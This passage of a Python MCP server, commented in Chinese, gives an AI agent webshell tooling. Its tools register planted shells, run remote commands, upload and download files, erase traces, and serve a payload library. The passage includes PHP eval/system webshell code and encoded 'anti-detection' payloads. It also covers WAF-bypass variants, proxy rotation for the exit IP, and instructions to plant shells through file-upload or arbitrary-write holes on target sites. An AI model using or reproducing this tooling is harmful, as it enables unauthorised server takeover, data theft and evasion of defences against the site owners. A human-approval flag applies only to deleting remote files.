    "if($s!==''){if(strpos($s,'$')!==false||strpos($s,';')!==false){@eval($s);}"
    "else{@system(base64_decode($s));}}"
)


def _rand_param(n=8):
    """随机参数名：字母+数字，首字符字母（shell_add 的 password 校验要求）。"""
    letters = "abcdefghijklmnopqrstuvwxyz"
    alnum = letters + "0123456789"
    out = [secrets.choice(letters)]
    out.extend(secrets.choice(alnum) for _ in range(max(n, 6) - 1))
    return "".join(out)


def _render_enc_payload(text, param=""):
    """把占位载荷渲染成可落地的全文，返回 (正文, 参数名)；非加密载荷原样返回。"""
    if ENC_BLOB_TOKEN not in text:
        return text, ""
    key = (param or "").strip() or _rand_param()
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,30}", key):
        raise ToolError("param 非法（字母/数字/下划线，字母或下划线开头）: %r" % key)
    co = zlib.compressobj(9, zlib.DEFLATED, -15)  # 裸 deflate，对齐 PHP gzinflate
    blob = base64.b64encode(co.compress(ENC_INNER.encode("utf-8")) + co.flush()).decode("ascii")
    return text.replace(ENC_BLOB_TOKEN, blob).replace(ENC_KEY_TOKEN, key), key


def tool_payload_get(args):
    name, path = _resolve_payload_name(args.get("name"))
    text = _read_payload_file(path)
    meta = _payload_meta(text)
    text, dynamic_key = _render_enc_payload(text, opt_str(args, "param", ""))
    # 库里带头注释（@summary/@scene/...），落地正文不带：文件落到目标上不能自带说明书
    text = _strip_payload_meta(text)
    data = text.encode("utf-8")
    log("payload_get %s (%d 字节, param=%s)" % (name, len(data), dynamic_key or "-"))

    typ, fn = name.split("/", 1)
    head = [
        "payload: %s" % name,
        "  类型: %s   大小: %d 字节   sha256: %s"
        % (typ, len(data), hashlib.sha256(data).hexdigest()[:16]),
        "  说明: %s" % (meta.get("summary") or "—"),
        "  适用场景: %s" % (meta.get("scene") or "—"),
        "  所需权限: %s" % (meta.get("perm") or "—"),
        "  WAF 绕过点: %s" % (meta.get("bypass") or "—"),
        "  参数说明: %s" % (meta.get("param") or "—"),
        "  配套 MCP: %s" % (meta.get("mcp") or "—"),
        "  文件头: 库里的说明注释已从下面正文剥掉（落地文件里不留可读说明）",
    ]
    if dynamic_key:
        head.extend([
            "  本次参数名: %s（随机字母+数字；shell_add 的 password 必须填这个，不要改成 pass/cmd/shell）"
            % dynamic_key,
            "  param=%s" % dynamic_key,
        ])
    head.extend([
        "",
        "落地方式: 把下面全文原样保存为 %s，通过目标站的文件上传/任意写漏洞放到可解析目录，" % fn,
        "          再用 shell_add 按上面「配套 MCP」的类型登记；之后 shell_exec / shell_upload /",
        "          shell_download 直接可用（命令型马的上传下载依赖远端 sh 或 PowerShell）。",
        "----- payload 开始 -----",
        text.rstrip("\n"),
        "----- payload 结束 -----",
    ])
    return ("\n".join(head)), False


# ---------------------------------------------------------------------------
# 工具注册表（tools/list 的定义）
# ---------------------------------------------------------------------------

TOOLS = [
    {
        "name": "shell_add",
        "description": (
            "登记一个已拿到的 WebShell 会话（只保存元数据，不做连通性探测）。"
            "会话存 /opt/artex/data/webshells.json（权限 600），同名再登记即覆盖。"
            "type 约定：php=一句话 eval 马（远端 <?php @eval($_POST['pass']); ?>，"
            "客户端用 base64 + system() 执行命令并自动兼容 base64 免杀马）；"
            "php_raw=代码执行马（cmd 直接当 PHP 代码执行）；"
            "jsp=命令型马（远端 Runtime.getRuntime().exec 执行参数）；"
            "aspx=命令型马（远端 Process.Start(\"cmd.exe\",\"/c \"+参数)）。"
            "落马请优先用 payload_get 取内置 payload 库里的马（payload_list 可查类型与适用场景），"
            "不要自己临时拼。"
            "登记后用 shell_exec 验证连通性。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "会话名（1-64 字符，建议用资产标识，如 web01-uploads）"},
                "url": {"type": "string", "description": "WebShell 完整 URL，如 http://1.2.3.4/shell.php"},
                "type": {
                    "type": "string",
                    "enum": ["php", "php_raw", "jsp", "aspx"],
                    "description": "马的种类：php / php_raw / jsp / aspx",
                },
                "password": {
                    "type": "string",
                    "default": "pass",
                    "description": "接收载荷的参数名（不是口令），默认 pass",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "default": "POST",
                    "description": "请求方法，默认 POST（GET 会把载荷放 query，易被日志/WAF 记录）",
                },
                "header": {
                    "type": "string",
                    "description": "可选，自定义请求头 JSON 字符串，如 {\"X-Token\":\"abc\"}（会被保存但 list 不展示）",
                },
                "note": {"type": "string", "description": "可选备注，如「上传点 /uploads、权限 www-data」"},
                "remote_path": {
                    "type": "string",
                    "description": (
                        "可选但强烈建议：这个马在目标服务器上的绝对路径，如 "
                        "/var/www/html/s.php。收尾 shell_del 清痕迹要靠它（命令型马"
                        "只能靠它定位，eval 型马可自己报 __FILE__）"
                    ),
                },
                "proxy": {
                    "type": "string",
                    "description": (
                        "可选，默认留空即可：留空＝跟随平台代理（代理订阅里选中的节点，"
                        "经 sing-box 边车出 127.0.0.1:7890），换节点时出口 IP 自动跟着变。"
                        "填 direct 强制直连；也可填显式代理 "
                        "socks5h://[user:pass@]host:port 或 http://[user:pass@]host:port，"
                        "或逗号分隔一串做池（配合 proxy_rotate 轮换）"
                    ),
                },
                "user_agent": {
                    "type": "string",
                    "description": "可选，覆盖默认 UA（默认是普通 Chrome UA，不带工具名）",
                },
                "proxy_rotate": {
                    "type": "boolean",
                    "default": False,
                    "description": (
                        "给了一串代理时是否每次请求都换出口。默认 False：同一会话固定"
                        "一个出口 IP（出口 IP 本身会变，一个马老换来源 IP 反而更显眼）。"
                        "只有单个出口被封、需要换着用时才开"
                    ),
                },
            },
            "required": ["name", "url", "type"],
        },
    },
    {
        "name": "shell_list",
        "description": (
            "列出已登记的全部 WebShell 会话（名称 / 类型 / URL / 请求方法 / 落地路径 / 出口 / 备注 / 创建时间）。"
            "出口一栏会写明「平台代理（随订阅节点变化）」/ 显式代理 / 直连。"
            "出于安全，不返回参数名（password）与自定义 header 值，出口代理的账密打码。"
        ),
        "inputSchema": {"type": "object", "properties": {}},
    },
    {
        "name": "shell_exec",
        "description": (
            "在已登记的 WebShell 上执行命令，返回纯 stdout（自动剥离马自身的标记与 base64 包装）。"
            "php 会话走 base64 + system()，并自动兼容 base64 免杀马（首次探测后缓存，后续只发一次请求）；"
            "php_raw 会话把 cmd 当 PHP 代码执行；jsp/aspx 为命令型马，cmd 原样交给远端执行。"
            "失败返回 isError=true，并附 HTTP 状态码与响应前 200 字；"
            "遇到 WAF 拦截页会明确报出而不是当成回显。输出超过 100KB 会截断。"
            "注意：若远端 PHP 用 disable_functions 禁了 system()，会表现为「稳定空回显」，"
            "此时改用 php_raw（代码执行马）或换用其他命令执行函数。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "已登记的会话名"},
                "cmd": {"type": "string", "description": "要执行的命令（php_raw 时是 PHP 代码，无需 <?php 标签）"},
                "timeout": {
                    "type": "integer", "default": 30, "minimum": 1, "maximum": 600,
                    "description": "HTTP 超时秒数，默认 30",
                },
            },
            "required": ["name", "cmd"],
        },
    },
    {
        "name": "shell_upload",
        "description": (
            "向远端写文件（分块追加写入，每块 ≤512KB，避免超长请求被 WAF 拦）。"
            "content 与 b64 二选一：文本用 content，二进制用 b64。"
            "php/php_raw 会话用 PHP file_put_contents（不依赖远端 shell）；"
            "jsp/免杀马走 printf+base64 -d（需远端 exec 经 sh）；aspx 走 PowerShell。"
            "上传后会复核字节数，不一致直接报错。"
            "上传过的远端路径会自动记进会话的上传残留清单，要清痕迹时 shell_del 传 remove_remote=true 才会一并删。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "已登记的会话名"},
                "remote_path": {"type": "string", "description": "远端绝对路径，如 /var/www/html/a.jsp"},
                "content": {"type": "string", "description": "文本内容（UTF-8）；与 b64 二选一"},
                "b64": {"type": "string", "description": "base64 内容（二进制用这个）；与 content 二选一"},
                "chunk_size": {
                    "type": "integer", "default": 524288, "minimum": 4096, "maximum": 524288,
                    "description": "分块大小，默认 512KB，上限 512KB",
                },
                "timeout": {
                    "type": "integer", "default": 30, "minimum": 1, "maximum": 600,
                    "description": "单块请求超时秒数，默认 30",
                },
            },
            "required": ["name", "remote_path"],
        },
    },
    {
        "name": "shell_download",
        "description": (
            "从远端读文件，最多 max_bytes（默认 2MB），超过就截断并在结果里注明原始大小。"
            "文本（UTF-8/GB18030 可解码）默认按文本返回，否则返回单行 base64；可用 as 强制指定。"
            "php/php_raw 用 PHP file_get_contents，jsp/免杀马走 head+base64，aspx 走 PowerShell。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "已登记的会话名"},
                "remote_path": {"type": "string", "description": "远端文件路径"},
                "max_bytes": {
                    "type": "integer", "default": 2097152, "minimum": 1, "maximum": 67108864,
                    "description": "返回上限字节数，默认 2MB，超出截断",
                },
                "as": {
                    "type": "string", "enum": ["auto", "text", "b64"], "default": "auto",
                    "description": "返回形式：auto 自动判断 / text 强制按文本 / b64 强制 base64",
                },
                "timeout": {
                    "type": "integer", "default": 30, "minimum": 1, "maximum": 600,
                    "description": "HTTP 超时秒数，默认 30",
                },
            },
            "required": ["name", "remote_path"],
        },
    },
    {
        "name": "shell_del",
        "description": (
            "删除会话。默认只摘掉本机登记（/opt/artex/data/webshells.json），远端文件一概不动。"
            "需要清痕迹时显式传 remove_remote=true（另需人工授权位 human_approved=true），才会："
            "① 删远端的马文件（php/php_raw 用 PHP unlink 自删，jsp/aspx 用 rm -f / del）；"
            "② 删该会话 shell_upload 上传过的残留；③ 再请求一次 URL 复查确认打不通；④ 摘登记。"
            "远端没清干净时报错并保留登记（活着的马不能静默失联），确要丢弃登记传 force=true。"
            "命令型马清远端必须知道绝对路径（shell_add 的 remote_path 或本工具的 path）。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "要删除的会话名"},
                "human_approved": {
                    "type": "boolean", "default": False,
                    "description": (
                        "人工授权位。remove_remote=true 且 human_approved=true 才会真删"
                        "目标上的远端文件；授权只能由操作人给出，agent 不得自行置位。"
                    ),
                },
                "remove_remote": {
                    "type": "boolean", "default": False,
                    "description": "是否连远端文件一起删。默认 false=只摘本机登记；要清痕迹才显式传 true（另需 human_approved）",
                },
                "path": {
                    "type": "string",
                    "description": "可选，马的绝对路径（覆盖 shell_add 里记的 remote_path）；命令型马必填项之一",
                },
                "force": {
                    "type": "boolean", "default": False,
                    "description": "远端删失败仍强制摘掉登记（默认 false：失败了保留登记并报错）",
                },
                "timeout": {
                    "type": "integer", "default": 30, "minimum": 1, "maximum": 600,
                    "description": "单次清理请求超时秒数，默认 30",
                },
            },
            "required": ["name"],
        },
    },
    {
        "name": "payload_list",
        "description": (
            "列出内置 WebShell payload 库（/opt/artex/payloads/webshell）里的马：名称、类型、"
            "大小、一句话说明、适用场景、参数说明与配套的 shell_add 类型。"
            "库内按 php / jsp / aspx 分目录，含通用 eval 马、base64 免杀马、assert 型、"
            "关键字拆分绕过版、create_function 版、回调型、完整文件管理马、JSP/ASPX 命令型与反射绕过版。"
            "做 webshell 落地时优先从这里选，不要自己临时拼。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "type": {
                    "type": "string",
                    "enum": ["php", "jsp", "aspx"],
                    "description": "可选，只看某一类（php / jsp / aspx）；留空则全部列出",
                },
            },
        },
    },
    {
        "name": "payload_get",
        "description": (
            "取内置 payload 的全文（供 agent 通过文件上传/任意写漏洞落地到目标）。"
            "name 形如 php/eval.php、jsp/cmd.jsp、aspx/bypass.aspx。"
            "返回前会给出类型、大小、sha256、适用场景、所需权限、WAF 绕过点、参数改法与配套 shell_add 类型。"
            "严格禁止路径穿越：不接受 ..、绝对路径、反斜杠，落点必须仍在 payload 库目录内。"
        ),
        "inputSchema": {
            "type": "object",
            "properties": {
                "name": {
                    "type": "string",
                    "description": "payload 相对路径，如 php/enc.php（用 payload_list 查看全部）",
                },
                "param": {
                    "type": "string",
                    "description": "仅加密型载荷用：指定参数名（字母+数字）；不填则随机生成并在结果里返回",
                },
            },
            "required": ["name"],
        },
    },
]

TOOL_HANDLERS = {
    "shell_add": tool_shell_add,
    "shell_list": tool_shell_list,
    "shell_exec": tool_shell_exec,
    "shell_upload": tool_shell_upload,
    "shell_download": tool_shell_download,
    "shell_del": tool_shell_del,
    "payload_list": tool_payload_list,
    "payload_get": tool_payload_get,
}


def call_tool(name, arguments):
    """执行工具，统一兜住异常 → (文本, isError)。"""
    handler = TOOL_HANDLERS.get(name)
    if handler is None:
        return ("未知工具: %s（可用: %s）" % (name, ", ".join(TOOL_HANDLERS))), True
    args = arguments if isinstance(arguments, dict) else {}
    try:
        text, is_err = handler(args)
        return text, bool(is_err)
    except ToolError as e:
        log("工具 %s 失败: %s" % (name, e))
        return ("%s 执行失败: %s" % (name, e)), True
    except Exception as e:
        log("工具 %s 异常: %s: %s" % (name, type(e).__name__, e))
        return ("%s 执行失败: %s: %s" % (name, type(e).__name__, e)), True


# ---------------------------------------------------------------------------
# JSON-RPC 分发
# ---------------------------------------------------------------------------

def handle_initialize(params):
    """握手：回显客户端协议版本，声明 tools 能力。"""
    requested = None
    if isinstance(params, dict):
        requested = params.get("protocolVersion")
    proto = requested if requested in SUPPORTED_PROTOCOLS else DEFAULT_PROTOCOL
    return {
        "protocolVersion": proto,
        "capabilities": {"tools": {"listChanged": False}},
        "serverInfo": {"name": SERVER_NAME, "version": SERVER_VERSION},
    }


def handle_tools_list(_params):
    return {"tools": TOOLS}


def handle_tools_call(params):
    if not isinstance(params, dict):
        raise ValueError("tools/call 的 params 必须是对象")
    name = params.get("name")
    if not isinstance(name, str) or not name:
        raise ValueError("tools/call 缺少工具名 name")
    arguments = params.get("arguments")
    text, is_err = call_tool(name, arguments)
    return {"content": [{"type": "text", "text": text}], "isError": is_err}


def dispatch(method, params):
    """按方法名分发；返回值即 result，未知方法抛 KeyError。"""
    if method == "initialize":
        return handle_initialize(params)
    if method == "ping":
        return {}
    if method == "tools/list":
        return handle_tools_list(params)
    if method == "tools/call":
        return handle_tools_call(params)
    # 未实现但常见的能力查询：返回空集合而不是报错，兼容性更好
    if method == "resources/list":
        return {"resources": []}
    if method == "resources/templates/list":
        return {"resourceTemplates": []}
    if method == "prompts/list":
        return {"prompts": []}
    if method == "logging/setLevel":
        return {}
    raise KeyError(method)


def main():
    reader = FramedReader(sys.stdin.buffer)
    writer = FramedWriter(sys.stdout.buffer)
    try:
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    except Exception:
        pass
    log("=== %s MCP 服务器启动 (pid=%d, python=%s) ==="
        % (SERVER_NAME, os.getpid(), sys.version.split()[0]))

    while True:
        raw = reader.read_message()
        if raw is None:
            log("stdin 已关闭，退出")
            break
        writer.sync(reader.mode)
        if not raw.strip():
            continue

        try:
            msg = json.loads(raw)
        except Exception as e:
            log("报文 JSON 解析失败: %s | 原文: %s" % (e, brief(raw, 200)))
            writer.send({
                "jsonrpc": "2.0", "id": None,
                "error": {"code": ERR_PARSE, "message": "JSON 解析失败: %s" % e},
            })
            continue

        if not isinstance(msg, dict):
            writer.send({
                "jsonrpc": "2.0", "id": None,
                "error": {"code": ERR_INVALID_REQUEST, "message": "报文必须是 JSON 对象"},
            })
            continue

        method = msg.get("method")
        msg_id = msg.get("id", None)
        has_id = "id" in msg
        params = msg.get("params")

        # 通知（无 id）一律不回复
        if not has_id:
            if method not in ("notifications/initialized", "notifications/cancelled",
                              "notifications/roots/list_changed"):
                log("收到通知: %s（按协议不回复）" % method)
            continue

        if not isinstance(method, str) or not method:
            writer.send({
                "jsonrpc": "2.0", "id": msg_id,
                "error": {"code": ERR_INVALID_REQUEST, "message": "缺少 method 字段"},
            })
            continue

        try:
            result = dispatch(method, params)
            writer.send({"jsonrpc": "2.0", "id": msg_id, "result": result})
            if method == "tools/call":
                tname = params.get("name") if isinstance(params, dict) else "?"
                log("tools/call %s 已返回" % tname)
        except KeyError:
            writer.send({
                "jsonrpc": "2.0", "id": msg_id,
                "error": {"code": ERR_METHOD_NOT_FOUND, "message": "未实现的方法: %s" % method},
            })
        except ValueError as e:
            writer.send({
                "jsonrpc": "2.0", "id": msg_id,
                "error": {"code": ERR_INVALID_PARAMS, "message": str(e)},
            })
        except Exception as e:
            log("处理方法 %s 异常: %s: %s" % (method, type(e).__name__, e))
            writer.send({
                "jsonrpc": "2.0", "id": msg_id,
                "error": {"code": ERR_INTERNAL, "message": "%s: %s" % (type(e).__name__, e)},
            })

    log("=== %s MCP 服务器退出 ===" % SERVER_NAME)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        # 绝对不能把 traceback 打到 stdout（会破坏协议帧）
        try:
            sys.stderr.write("webshell_mcp 致命错误: %s: %s\n" % (type(e).__name__, e))
        except Exception:
            pass
        log("致命错误: %s: %s" % (type(e).__name__, e))
        sys.exit(1)
